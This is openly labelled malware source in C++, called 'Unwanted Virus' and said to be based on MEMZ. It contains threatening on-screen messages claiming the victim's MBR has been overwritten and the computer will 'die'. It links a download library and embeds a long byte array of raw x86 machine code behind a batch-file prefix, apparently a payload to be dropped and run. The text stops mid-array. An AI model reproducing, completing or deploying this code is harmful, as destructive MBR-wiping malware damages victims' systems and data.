/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x6A, 0x64, 0xFF, 0xD6, 0xEB, 0xE6, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0xA1, 0x04, 0x30, 0x40, 0x00, 0x33,
0xC5, 0x89, 0x45, 0xFC, 0x53, 0x56, 0x57, 0x6A, 0x00, 0xFF, 0x15, 0x1C,
0x20, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x70, 0x20, 0x40, 0x00, 0x8B, 0x35,
0x24, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x30, 0x10, 0x40,
0x00, 0x68, 0x00, 0x10, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0xD6,
0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x70, 0x11, 0x40, 0x00, 0x68,
0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD6, 0x68, 0xE8, 0x03, 0x00,
0x00, 0xFF, 0x15, 0x40, 0x20, 0x40, 0x00, 0x68, 0x40, 0x21, 0x40, 0x00,
0xFF, 0x15, 0x3C, 0x20, 0x40, 0x00, 0x8B, 0x35, 0x18, 0x20, 0x40, 0x00,
0x8B, 0xF8, 0x68, 0x48, 0x21, 0x40, 0x00, 0x57, 0xFF, 0xD6, 0x68, 0x5C,
0x21, 0x40, 0x00, 0x57, 0x8B, 0xD8, 0xFF, 0xD6, 0x8B, 0xF0, 0x85, 0xDB,
0x74, 0x26, 0x85, 0xF6, 0x74, 0x22, 0x8D, 0x45, 0xFB, 0x50, 0x6A, 0x00,
0x6A, 0x01, 0x6A, 0x13, 0xFF, 0xD3, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0x06,
0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x9A, 0x02, 0x00, 0xC0, 0xFF,
0xD6, 0x83, 0xC4, 0x28, 0x8D, 0x45, 0xE0, 0x50, 0x6A, 0x28, 0xFF, 0x15,
0x4C, 0x20, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x08, 0x20, 0x40, 0x00, 0x8D,
0x45, 0xE8, 0x50, 0x68, 0x70, 0x21, 0x40, 0x00, 0x6A, 0x00, 0xFF, 0x15,
0x0C, 0x20, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0x45,
0xE4, 0xC7, 0x45, 0xE4, 0x01, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x00, 0xFF,
0x75, 0xE0, 0xC7, 0x45, 0xF0, 0x02, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x00,
0x20, 0x40, 0x00, 0x68, 0x07, 0x00, 0x01, 0x00, 0x6A, 0x06, 0xFF, 0x15,
0x6C, 0x20, 0x40, 0x00, 0x8B, 0x4D, 0xFC, 0x33, 0xC0, 0x5F, 0x5E, 0x33,
0xCD, 0x5B, 0xE8, 0x04, 0x00, 0x00, 0x00, 0x8B, 0xE5, 0x5D, 0xC3, 0x3B,
0x0D, 0x04, 0x30, 0x40, 0x00, 0x75, 0x01, 0xC3, 0xE9, 0x79, 0x02, 0x00,
0x00, 0x56, 0x6A, 0x01, 0xE8, 0x76, 0x0B, 0x00, 0x00, 0xE8, 0x56, 0x06,
0x00, 0x00, 0x50, 0xE8, 0xA1, 0x0B, 0x00, 0x00, 0xE8, 0x44, 0x06, 0x00,
0x00, 0x8B, 0xF0, 0xE8, 0xC5, 0x0B, 0x00, 0x00, 0x6A, 0x01, 0x89, 0x30,
0xE8, 0xFA, 0x03, 0x00, 0x00, 0x83, 0xC4, 0x0C, 0x5E, 0x84, 0xC0, 0x74,
0x73, 0xDB, 0xE2, 0xE8, 0x73, 0x08, 0x00, 0x00, 0x68, 0x97, 0x1B, 0x40,
0x00, 0xE8, 0x6E, 0x05, 0x00, 0x00, 0xE8, 0x19, 0x06, 0x00, 0x00, 0x50,
0xE8, 0x3E, 0x0B, 0x00, 0x00, 0x59, 0x59, 0x85, 0xC0, 0x75, 0x51, 0xE8,
0x12, 0x06, 0x00, 0x00, 0xE8, 0x69, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74,
0x0B, 0x68, 0x1D, 0x19, 0x40, 0x00, 0xE8, 0x1A, 0x0B, 0x00, 0x00, 0x59,
0xE8, 0x29, 0x06, 0x00, 0x00, 0xE8, 0x24, 0x06, 0x00, 0x00, 0xE8, 0xFE,
0x05, 0x00, 0x00, 0xE8, 0xDD, 0x05, 0x00, 0x00, 0x50, 0xE8, 0x53, 0x0B,
0x00, 0x00, 0x59, 0xE8, 0xEA, 0x05, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x05,
0xE8, 0xFC, 0x0A, 0x00, 0x00, 0xE8, 0xC3, 0x05, 0x00, 0x00, 0xE8, 0x5A,
0x07, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x01, 0xC3, 0x6A, 0x07, 0xE8, 0x33,
0x06, 0x00, 0x00, 0xCC, 0xE8, 0xF8, 0x05, 0x00, 0x00, 0x33, 0xC0, 0xC3,
0xE8, 0x88, 0x07, 0x00, 0x00, 0xE8, 0x9F, 0x05, 0x00, 0x00, 0x50, 0xE8,
0x1B, 0x0B, 0x00, 0x00, 0x59, 0xC3, 0x6A, 0x14, 0x68, 0x58, 0x26, 0x40,
0x00, 0xE8, 0x3E, 0x08, 0x00, 0x00, 0x6A, 0x01, 0xE8, 0x11, 0x03, 0x00,
0x00, 0x59, 0x84, 0xC0, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0x32, 0xDB,
0x88, 0x5D, 0xE7, 0x83, 0x65, 0xFC, 0x00, 0xE8, 0xC8, 0x02, 0x00, 0x00,
0x88, 0x45, 0xDC, 0xA1, 0x34, 0x33, 0x40, 0x00, 0x33, 0xC9, 0x41, 0x3B,
0xC1, 0x0F, 0x84, 0x2F, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x49, 0x89,
0x0D, 0x34, 0x33, 0x40, 0x00, 0x68, 0x20, 0x21, 0x40, 0x00, 0x68, 0x14,
0x21, 0x40, 0x00, 0xE8, 0x87, 0x0A, 0x00, 0x00, 0x59, 0x59, 0x85, 0xC0,
0x74, 0x11, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFF, 0x00,
0x00, 0x00, 0xE9, 0xEF, 0x00, 0x00, 0x00, 0x68, 0x10, 0x21, 0x40, 0x00,
0x68, 0x08, 0x21, 0x40, 0x00, 0xE8, 0x5B, 0x0A, 0x00, 0x00, 0x59, 0x59,
0xC7, 0x05, 0x34, 0x33, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x05,
0x8A, 0xD9, 0x88, 0x5D, 0xE7, 0xFF, 0x75, 0xDC, 0xE8, 0xE1, 0x03, 0x00,
0x00, 0x59, 0xE8, 0x6F, 0x05, 0x00, 0x00, 0x8B, 0xF0, 0x33, 0xFF, 0x39,
0x3E, 0x74, 0x1B, 0x56, 0xE8, 0x39, 0x03, 0x00, 0x00, 0x59, 0x84, 0xC0,
0x74, 0x10, 0x8B, 0x36, 0x57, 0x6A, 0x02, 0x57, 0x8B, 0xCE, 0xFF, 0x15,
0x04, 0x21, 0x40, 0x00, 0xFF, 0xD6, 0xE8, 0x4D, 0x05, 0x00, 0x00, 0x8B,
0xF0, 0x39, 0x3E, 0x74, 0x13, 0x56, 0xE8, 0x13, 0x03, 0x00, 0x00, 0x59,
0x84, 0xC0, 0x74, 0x08, 0xFF, 0x36, 0xE8, 0x30, 0x0A, 0x00, 0x00, 0x59,
0xE8, 0xEE, 0x09, 0x00, 0x00, 0x8B, 0xF8, 0xE8, 0x11, 0x0A, 0x00, 0x00,
0x8B, 0x30, 0xE8, 0x04, 0x0A, 0x00, 0x00, 0x57, 0x56, 0xFF, 0x30, 0xE8,
0x20, 0xFD, 0xFF, 0xFF, 0x83, 0xC4, 0x0C, 0x8B, 0xF0, 0xE8, 0x34, 0x06,
0x00, 0x00, 0x84, 0xC0, 0x74, 0x6B, 0x84, 0xDB, 0x75, 0x05, 0xE8, 0xF0,
0x09, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0xE8, 0x7B, 0x03, 0x00, 0x00,
0x59, 0x59, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x8B, 0xC6, 0xEB,
0x35, 0x8B, 0x4D, 0xEC, 0x8B, 0x01, 0x8B, 0x00, 0x89, 0x45, 0xE0, 0x51,
0x50, 0xE8, 0x7B, 0x09, 0x00, 0x00, 0x59, 0x59, 0xC3, 0x8B, 0x65, 0xE8,
0xE8, 0xF5, 0x05, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x32, 0x80, 0x7D, 0xE7,
0x00, 0x75, 0x05, 0xE8, 0xB5, 0x09, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0xFE,
0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xE0, 0x8B, 0x4D, 0xF0, 0x64, 0x89, 0x0D,
0x00, 0x00, 0x00, 0x00, 0x59, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x6A, 0x07,
0xE8, 0xA5, 0x04, 0x00, 0x00, 0x56, 0xE8, 0x6A, 0x09, 0x00, 0x00, 0xFF,
0x75, 0xE0, 0xE8, 0x68, 0x09, 0x00, 0x00, 0xCC, 0xE8, 0xC5, 0x03, 0x00,
0x00, 0xE9, 0x74, 0xFE, 0xFF, 0xFF, 0x55, 0x8B, 0xEC, 0x6A, 0x00, 0xFF,
0x15, 0x50, 0x20, 0x40, 0x00, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0x54, 0x20,
0x40, 0x00, 0x68, 0x09, 0x04, 0x00, 0xC0, 0xFF, 0x15, 0x4C, 0x20, 0x40,
0x00, 0x50, 0xFF, 0x15, 0x38, 0x20, 0x40, 0x00, 0x5D, 0xC3, 0x55, 0x8B,
0xEC, 0x81, 0xEC, 0x24, 0x03, 0x00, 0x00, 0x6A, 0x17, 0xFF, 0x15, 0x34,
0x20, 0x40, 0x00, 0x85, 0xC0, 0x74, 0x05, 0x6A, 0x02, 0x59, 0xCD, 0x29,
0xA3, 0x18, 0x31, 0x40, 0x00, 0x89, 0x0D, 0x14, 0x31, 0x40, 0x00, 0x89,
0x15, 0x10, 0x31, 0x40, 0x00, 0x89, 0x1D, 0x0C, 0x31, 0x40, 0x00, 0x89,
0x35, 0x08, 0x31, 0x40, 0x00, 0x89, 0x3D, 0x04, 0x31, 0x40, 0x00, 0x66,
0x8C, 0x15, 0x30, 0x31, 0x40, 0x00, 0x66, 0x8C, 0x0D, 0x24, 0x31, 0x40,
0x00, 0x66, 0x8C, 0x1D, 0x00, 0x31, 0x40, 0x00, 0x66, 0x8C, 0x05, 0xFC,
0x30, 0x40, 0x00, 0x66, 0x8C, 0x25, 0xF8, 0x30, 0x40, 0x00, 0x66, 0x8C,
0x2D, 0xF4, 0x30, 0x40, 0x00, 0x9C, 0x8F, 0x05, 0x28, 0x31, 0x40, 0x00,
0x8B, 0x45, 0x00, 0xA3, 0x1C, 0x31, 0x40, 0x00, 0x8B, 0x45, 0x04, 0xA3,
0x20, 0x31, 0x40, 0x00, 0x8D, 0x45, 0x08, 0xA3, 0x2C, 0x31, 0x40, 0x00,
0x8B, 0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0xC7, 0x05, 0x68, 0x30, 0x40, 0x00,
0x01, 0x00, 0x01, 0x00, 0xA1, 0x20, 0x31, 0x40, 0x00, 0xA3, 0x24, 0x30,
0x40, 0x00, 0xC7, 0x05, 0x18, 0x30, 0x40, 0x00, 0x09, 0x04, 0x00, 0xC0,
0xC7, 0x05, 0x1C, 0x30, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x05,
0x28, 0x30, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0x6A, 0x04, 0x58, 0x6B,
0xC0, 0x00, 0xC7, 0x80, 0x2C, 0x30, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00,
0x6A, 0x04, 0x58, 0x6B, 0xC0, 0x00, 0x8B, 0x0D, 0x04, 0x30, 0x40, 0x00,
0x89, 0x4C, 0x05, 0xF8, 0x6A, 0x04, 0x58, 0xC1, 0xE0, 0x00, 0x8B, 0x0D,
0x00, 0x30, 0x40, 0x00, 0x89, 0x4C, 0x05, 0xF8, 0x68, 0x38, 0x21, 0x40,
0x00, 0xE8, 0xE0, 0xFE, 0xFF, 0xFF, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x8B,
0x45, 0x08, 0x56, 0x8B, 0x48, 0x3C, 0x03, 0xC8, 0x0F, 0xB7, 0x41, 0x14,
0x8D, 0x51, 0x18, 0x03, 0xD0, 0x0F, 0xB7, 0x41, 0x06, 0x6B, 0xF0, 0x28,
0x03, 0xF2, 0x3B, 0xD6, 0x74, 0x19, 0x8B, 0x4D, 0x0C, 0x3B, 0x4A, 0x0C,
0x72, 0x0A, 0x8B, 0x42, 0x08, 0x03, 0x42, 0x0C, 0x3B, 0xC8, 0x72, 0x0C,
0x83, 0xC2, 0x28, 0x3B, 0xD6, 0x75, 0xEA, 0x33, 0xC0, 0x5E, 0x5D, 0xC3,
0x8B, 0xC2, 0xEB, 0xF9, 0x56, 0xE8, 0x97, 0x07, 0x00, 0x00, 0x85, 0xC0,
0x74, 0x20, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0xBE, 0x38, 0x33, 0x40,
0x00, 0x8B, 0x50, 0x04, 0xEB, 0x04, 0x3B, 0xD0, 0x74, 0x10, 0x33, 0xC0,
0x8B, 0xCA, 0xF0, 0x0F, 0xB1, 0x0E, 0x85, 0xC0, 0x75, 0xF0, 0x32, 0xC0,
0x5E, 0xC3, 0xB0, 0x01, 0x5E, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0x7D, 0x08,
0x00, 0x75, 0x07, 0xC6, 0x05, 0x3C, 0x33, 0x40, 0x00, 0x01, 0xE8, 0x85,
0x05, 0x00, 0x00, 0xE8, 0x72, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04,
0x32, 0xC0, 0x5D, 0xC3, 0xE8, 0x65, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75,
0x0A, 0x6A, 0x00, 0xE8, 0x5A, 0x02, 0x00, 0x00, 0x59, 0xEB, 0xE9, 0xB0,
0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x80, 0x3D, 0x3D, 0x33, 0x40, 0x00,
0x00, 0x74, 0x04, 0xB0, 0x01, 0x5D, 0xC3, 0x56, 0x8B, 0x75, 0x08, 0x85,
0xF6, 0x74, 0x05, 0x83, 0xFE, 0x01, 0x75, 0x62, 0xE8, 0x10, 0x07, 0x00,
0x00, 0x85, 0xC0, 0x74, 0x26, 0x85, 0xF6, 0x75, 0x22, 0x68, 0x40, 0x33,
0x40, 0x00, 0xE8, 0x94, 0x07, 0x00, 0x00, 0x59, 0x85, 0xC0, 0x75, 0x0F,
0x68, 0x4C, 0x33, 0x40, 0x00, 0xE8, 0x85, 0x07, 0x00, 0x00, 0x59, 0x85,
0xC0, 0x74, 0x2B, 0x32, 0xC0, 0xEB, 0x30, 0x83, 0xC9, 0xFF, 0x89, 0x0D,
0x40, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x44, 0x33, 0x40, 0x00, 0x89, 0x0D,
0x48, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x4C, 0x33, 0x40, 0x00, 0x89, 0x0D,
0x50, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x54, 0x33, 0x40, 0x00, 0xC6, 0x05,
0x3D, 0x33, 0x40, 0x00, 0x01, 0xB0, 0x01, 0x5E, 0x5D, 0xC3, 0x6A, 0x05,
0xE8, 0x35, 0x02, 0x00, 0x00, 0xCC, 0x6A, 0x08, 0x68, 0x78, 0x26, 0x40,
0x00, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x83, 0x65, 0xFC, 0x00, 0xB8, 0x4D,
0x5A, 0x00, 0x00, 0x66, 0x39, 0x05, 0x00, 0x00, 0x40, 0x00, 0x75, 0x5D,
0xA1, 0x3C, 0x00, 0x40, 0x00, 0x81, 0xB8, 0x00, 0x00, 0x40, 0x00, 0x50,
0x45, 0x00, 0x00, 0x75, 0x4C, 0xB9, 0x0B, 0x01, 0x00, 0x00, 0x66, 0x39,
0x88, 0x18, 0x00, 0x40, 0x00, 0x75, 0x3E, 0x8B, 0x45, 0x08, 0xB9, 0x00,
0x00, 0x40, 0x00, 0x2B, 0xC1, 0x50, 0x51, 0xE8, 0x7C, 0xFE, 0xFF, 0xFF,
0x59, 0x59, 0x85, 0xC0, 0x74, 0x27, 0x83, 0x78, 0x24, 0x00, 0x7C, 0x21,
0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xB0, 0x01, 0xEB, 0x1F, 0x8B,
0x45, 0xEC, 0x8B, 0x00, 0x33, 0xC9, 0x81, 0x38, 0x05, 0x00, 0x00, 0xC0,
0x0F, 0x94, 0xC1, 0x8B, 0xC1, 0xC3, 0x8B, 0x65, 0xE8, 0xC7, 0x45, 0xFC,
0xFE, 0xFF, 0xFF, 0xFF, 0x32, 0xC0, 0x8B, 0x4D, 0xF0, 0x64, 0x89, 0x0D,
0x00, 0x00, 0x00, 0x00, 0x59, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B,
0xEC, 0xE8, 0x0F, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0F, 0x80, 0x7D,
0x08, 0x00, 0x75, 0x09, 0x33, 0xC0, 0xB9, 0x38, 0x33, 0x40, 0x00, 0x87,
0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x80, 0x3D, 0x3C, 0x33, 0x40, 0x00,
0x00, 0x74, 0x06, 0x80, 0x7D, 0x0C, 0x00, 0x75, 0x12, 0xFF, 0x75, 0x08,
0xE8, 0x01, 0x01, 0x00, 0x00, 0xFF, 0x75, 0x08, 0xE8, 0xF9, 0x00, 0x00,
0x00, 0x59, 0x59, 0xB0, 0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0x3D,
0x40, 0x33, 0x40, 0x00, 0xFF, 0xFF, 0x75, 0x08, 0x75, 0x07, 0xE8, 0x60,
0x06, 0x00, 0x00, 0xEB, 0x0B, 0x68, 0x40, 0x33, 0x40, 0x00, 0xE8, 0x4E,
0x06, 0x00, 0x00, 0x59, 0xF7, 0xD8, 0x59, 0x1B, 0xC0, 0xF7, 0xD0, 0x23,
0x45, 0x08, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0xFF, 0x75, 0x08, 0xE8, 0xC8,
0xFF, 0xFF, 0xFF, 0xF7, 0xD8, 0x59, 0x1B, 0xC0, 0xF7, 0xD8, 0x48, 0x5D,
0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x83, 0x65, 0xF4, 0x00, 0x8D,
0x45, 0xF4, 0x83, 0x65, 0xF8, 0x00, 0x50, 0xFF, 0x15, 0x28, 0x20, 0x40,
0x00, 0x8B, 0x45, 0xF8, 0x33, 0x45, 0xF4, 0x89, 0x45, 0xFC, 0xFF, 0x15,
0x44, 0x20, 0x40, 0x00, 0x31, 0x45, 0xFC, 0xFF, 0x15, 0x2C, 0x20, 0x40,
0x00, 0x31, 0x45, 0xFC, 0x8D, 0x45, 0xEC, 0x50, 0xFF, 0x15, 0x30, 0x20,
0x40, 0x00, 0x8B, 0x45, 0xF0, 0x8D, 0x4D, 0xFC, 0x33, 0x45, 0xEC, 0x33,
0x45, 0xFC, 0x33, 0xC1, 0xC9, 0xC3, 0x8B, 0x0D, 0x04, 0x30, 0x40, 0x00,
0x56, 0x57, 0xBF, 0x4E, 0xE6, 0x40, 0xBB, 0xBE, 0x00, 0x00, 0xFF, 0xFF,
0x3B, 0xCF, 0x74, 0x04, 0x85, 0xCE, 0x75, 0x26, 0xE8, 0x94, 0xFF, 0xFF,
0xFF, 0x8B, 0xC8, 0x3B, 0xCF, 0x75, 0x07, 0xB9, 0x4F, 0xE6, 0x40, 0xBB,
0xEB, 0x0E, 0x85, 0xCE, 0x75, 0x0A, 0x0D, 0x11, 0x47, 0x00, 0x00, 0xC1,
0xE0, 0x10, 0x0B, 0xC8, 0x89, 0x0D, 0x04, 0x30, 0x40, 0x00, 0xF7, 0xD1,
0x5F, 0x89, 0x0D, 0x00, 0x30, 0x40, 0x00, 0x5E, 0xC3, 0x33, 0xC0, 0xC3,
0x33, 0xC0, 0x40, 0xC3, 0xB8, 0x00, 0x40, 0x00, 0x00, 0xC3, 0x68, 0x58,
0x33, 0x40, 0x00, 0xFF, 0x15, 0x48, 0x20, 0x40, 0x00, 0xC3, 0xB0, 0x01,
0xC3, 0x68, 0x00, 0x00, 0x03, 0x00, 0x68, 0x00, 0x00, 0x01, 0x00, 0x6A,
0x00, 0xE8, 0x73, 0x05, 0x00, 0x00, 0x83, 0xC4, 0x0C, 0x85, 0xC0, 0x75,
0x01, 0xC3, 0x6A, 0x07, 0xE8, 0x45, 0x00, 0x00, 0x00, 0xCC, 0xC2, 0x00,
0x00, 0xB8, 0x60, 0x33, 0x40, 0x00, 0xC3, 0xB8, 0x68, 0x33, 0x40, 0x00,
0xC3, 0xE8, 0xEF, 0xFF, 0xFF, 0xFF, 0x8B, 0x48, 0x04, 0x83, 0x08, 0x24,
0x89, 0x48, 0x04, 0xE8, 0xE7, 0xFF, 0xFF, 0xFF, 0x8B, 0x48, 0x04, 0x83,
0x08, 0x02, 0x89, 0x48, 0x04, 0xC3, 0x33, 0xC0, 0x39, 0x05, 0x0C, 0x30,
0x40, 0x00, 0x0F, 0x94, 0xC0, 0xC3, 0xB8, 0x90, 0x33, 0x40, 0x00, 0xC3,
0xB8, 0x8C, 0x33, 0x40, 0x00, 0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x24,
0x03, 0x00, 0x00, 0x53, 0x6A, 0x17, 0xFF, 0x15, 0x34, 0x20, 0x40, 0x00,
0x85, 0xC0, 0x74, 0x05, 0x8B, 0x4D, 0x08, 0xCD, 0x29, 0x6A, 0x03, 0xE8,
0xA3, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0xCC, 0x02, 0x00, 0x00, 0x8D,
0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x6A, 0x00, 0x50, 0xE8, 0x58, 0x04, 0x00,
0x00, 0x83, 0xC4, 0x0C, 0x89, 0x85, 0x8C, 0xFD, 0xFF, 0xFF, 0x89, 0x8D,
0x88, 0xFD, 0xFF, 0xFF, 0x89, 0x95, 0x84, 0xFD, 0xFF, 0xFF, 0x89, 0x9D,
0x80, 0xFD, 0xFF, 0xFF, 0x89, 0xB5, 0x7C, 0xFD, 0xFF, 0xFF, 0x89, 0xBD,
0x78, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0x95, 0xA4, 0xFD, 0xFF, 0xFF, 0x66,
0x8C, 0x8D, 0x98, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0x9D, 0x74, 0xFD, 0xFF,
0xFF, 0x66, 0x8C, 0x85, 0x70, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0xA5, 0x6C,
0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0xAD, 0x68, 0xFD, 0xFF, 0xFF, 0x9C, 0x8F,
0x85, 0x9C, 0xFD, 0xFF, 0xFF, 0x8B, 0x45, 0x04, 0x89, 0x85, 0x94, 0xFD,
0xFF, 0xFF, 0x8D, 0x45, 0x04, 0x89, 0x85, 0xA0, 0xFD, 0xFF, 0xFF, 0xC7,
0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x01, 0x00, 0x01, 0x00, 0x8B, 0x40, 0xFC,
0x6A, 0x50, 0x89, 0x85, 0x90, 0xFD, 0xFF, 0xFF, 0x8D, 0x45, 0xA8, 0x6A,
0x00, 0x50, 0xE8, 0xCE, 0x03, 0x00, 0x00, 0x8B, 0x45, 0x04, 0x83, 0xC4,
0x0C, 0xC7, 0x45, 0xA8, 0x15, 0x00, 0x00, 0x40, 0xC7, 0x45, 0xAC, 0x01,
0x00, 0x00, 0x00, 0x89, 0x45, 0xB4, 0xFF, 0x15, 0x20, 0x20, 0x40, 0x00,
0x6A, 0x00, 0x8D, 0x58, 0xFF, 0xF7, 0xDB, 0x8D, 0x45, 0xA8, 0x89, 0x45,
0xF8, 0x8D, 0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x1A, 0xDB, 0x89, 0x45, 0xFC,
0xFE, 0xC3, 0xFF, 0x15, 0x50, 0x20, 0x40, 0x00, 0x8D, 0x45, 0xF8, 0x50,
0xFF, 0x15, 0x54, 0x20, 0x40, 0x00, 0x85, 0xC0, 0x75, 0x0C, 0x84, 0xDB,
0x75, 0x08, 0x6A, 0x03, 0xE8, 0xAE, 0x00, 0x00, 0x00, 0x59, 0x5B, 0xC9,
0xC3, 0xE9, 0x5F, 0xFE, 0xFF, 0xFF, 0x6A, 0x00, 0xFF, 0x15, 0x58, 0x20,
0x40, 0x00, 0x85, 0xC0, 0x74, 0x34, 0xB9, 0x4D, 0x5A, 0x00, 0x00, 0x66,
0x39, 0x08, 0x75, 0x2A, 0x8B, 0x48, 0x3C, 0x03, 0xC8, 0x81, 0x39, 0x50,
0x45, 0x00, 0x00, 0x75, 0x1D, 0xB8, 0x0B, 0x01, 0x00, 0x00, 0x66, 0x39,
